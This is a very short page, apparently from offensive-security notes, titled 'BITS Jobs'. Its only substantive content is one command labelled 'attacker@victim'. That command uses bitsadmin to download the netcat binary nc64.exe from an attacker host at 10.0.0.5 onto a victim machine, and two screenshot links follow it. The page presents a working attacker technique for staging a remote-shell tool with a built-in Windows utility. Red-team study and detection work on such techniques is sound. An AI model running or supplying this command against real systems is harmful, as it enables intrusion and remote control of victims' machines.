# BITS Jobs

## Execution

{% code title="attacker@victim" %}
```c
bitsadmin /transfer myjob /download /priority high http://10.0.0.5/nc64.exe c:\temp\nc.exe
```
{% endcode %}

![](../../.gitbook/assets/bits-download.png)

![](../../.gitbook/assets/bits-cmdline.png)
